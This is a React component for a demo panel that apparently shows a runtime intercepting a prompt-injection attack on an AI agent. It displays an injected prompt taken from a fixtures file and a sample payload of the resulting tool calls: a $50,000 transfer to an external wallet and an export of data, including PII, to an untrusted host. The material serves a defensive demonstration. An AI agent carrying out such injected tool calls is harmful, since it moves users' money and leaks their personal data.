"use client";

import { motion } from "framer-motion";
import { Terminal, ShieldAlert } from "lucide-react";
import TraceNode from "./TraceNode";
import { INJECTED_PROMPT, TRACE_ID } from "./fixtures";

export default function RequestPane({ phase }: { phase: string }) {
  // Using an arbitrary raw payload representing what the runtime caught pre-execution
  const rawPayload = {
    session_id: TRACE_ID,
    scenario: "hostile_agent_interception",
    tool_calls: [
      {
        name: "transfer_funds",
        arguments: {
          amount: 50000,
          destination: "external_vendor_wallet_x"
        }
      },
      {
        name: "export_data",
        arguments: {
          target: "http://untrusted-analytics.com",
          include_pii: true
        }
      }
    ]
  };

  return (
    <div className="bg-[#0A0A0A] border border-[#242424] rounded-xl overflow-hidden flex flex-col h-[400px]">
      <div className="bg-[#111] border-b border-[#242424] px-4 py-3 flex items-center gap-2">
        <Terminal className="w-4 h-4 text-[#A1A1A6]" />
        <span className="text-[#A1A1A6] font-mono text-[10px] uppercase tracking-wider font-bold">1. The Injection</span>
      </div>
      
      <div className="p-4 flex-1 overflow-auto font-mono text-xs text-[#E5E5E5] leading-relaxed space-y-4">
        
        {/* Step 1: Injected Prompt (Always visible) */}
        <div className="border-l-[3px] border-red-500 bg-[#131313] p-4 rounded-r-md border-t border-b border-r border-[#242424]">
          <div className="text-[10px] text-red-500 font-bold tracking-widest uppercase mb-2 flex items-center gap-2">
            <ShieldAlert className="w-3 h-3" />
            INJECTED PROMPT · SESSION {TRACE_ID.slice(0,10)}
          </div>
          <div className="text-gray-300">
            "{INJECTED_PROMPT}"
          </div>
        </div>

        {/* The resulting raw payload structure */}
        {(phase === "ran" || phase === "replayed" || phase === "receipted") && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="mt-4"
          >
            <div className="text-xs text-[#666] mb-2 uppercase tracking-widest font-bold">Generated Payload</div>
            <TraceNode data={rawPayload} defaultOpen={false} />
          </motion.div>
        )}
      </div>
    </div>
  );
}
